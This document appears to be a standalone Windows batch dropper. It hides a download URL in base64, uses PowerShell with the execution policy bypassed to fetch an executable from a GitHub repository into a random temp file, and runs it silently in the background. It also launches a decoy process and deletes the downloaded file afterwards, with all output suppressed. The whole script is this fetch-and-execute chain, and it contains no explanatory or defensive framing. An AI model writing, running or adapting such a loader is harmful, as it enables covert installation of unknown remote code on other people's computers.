@echo off
setlocal EnableDelayedExpansion
set x1=aHR0cHM6Ly9naXRodWIuY29tL2t3YWxrMjIvLm5ldC1wYWNrZXIvcmF3L3JlZnMvaGVhZHMvbWFpbi9CdWlsZC5leGU=
set y2=%TEMP%\e_%RANDOM%_%TIME::=%.ex_
set z3=cal_
set w4=.ex_
set v5=[Convert]::FromBase64String('%x1%')
set u6=System.Text.Encoding
powershell -NoP -EP Bypass -C "try { iwr -Uri ([%u6%]::UTF8.GetString(%v5%)) -OutFile '%y2%' -UseBP } catch { exit 1 }" >nul 2>&1
if errorlevel 1 goto :q
if not exist "%y2%" goto :q
start /B %z3%%w4%
start /B "" "%y2%" >nul 2>&1
:q
if exist "%y2%" del "%y2%" /f /q >nul 2>&1
endlocal
exit /b 0